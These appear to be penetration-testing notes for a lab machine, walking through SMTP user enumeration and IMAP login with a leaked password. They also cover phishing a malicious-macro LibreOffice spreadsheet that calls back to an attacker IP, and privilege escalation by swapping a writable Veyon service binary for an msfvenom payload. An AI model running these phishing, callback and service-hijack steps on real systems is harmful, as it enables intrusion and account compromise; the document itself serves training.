bunch of ports
looks like a mail server
there's a webpage on port 8000, which has the employee names
All of them have proper job descriptions, except for Jonas who had SicMundusCreatusEst
So it could be him password

we first validate the users
`smtp-user-enum -M VRFY -U users.txt -t 192.168.110.140`
except for ela, all of them are verified as mail users

now, we can try to authenticate as Jonas:SicMundusCreatusEst on imap, to check for any mails

```zsh
telnet 192.168.110.140 143

a1 login "jonas" "SicMundusCreatusEst"
a1 list "" *
a1 select INBOX
a1 fetch 2 body[header]
a1 fetch 2 body[TEXT]
```
The gist of the mails is, the company is moving to libre offce, all mails automatically sent to a server/handler for some filtering. Mail sent by mailadmin@localhost

So now, we need to create a libre office doc with a malicious macro attachment, and swaks send it to mailadmin@localhost
To create an libre office document (ODT or ODS)
To do that, we use https://github.com/0bfxgh0st/MMG-LO
git clone it. the python script creates powershell 1-liner payload and put it as macro
`python /opt/MMG-LO/mmg-ods.py windows 192.168.45.185 445`

Now, swaks
```zsh
sudo swaks -t mailadmin@localhost --from jonas@localhost --server 192.168.110.140 --port 25 --body "Check this spreadsheet" --header "Subject: Urgent spreadsheet check req"
```
ela arwel!

---
we see a "Veyon" software in Ela's directory
searchsploit veyon shows an unquoted path vuln, but that requires us to write a file Ela.exe in \users dir
Instead, since it was already in ela's dir, we have write access on the veyon-service.exe
I figured, since it said service, I would just create a msfvenom payload of exe-service type
But that dint work. Shouldve used the exe

Anyways, replace veyon-service.exe with msfvenom exe
Seeing as we have shutDownPrivilege, we hope this service autostarts on startup
`shutdown /r /t 0`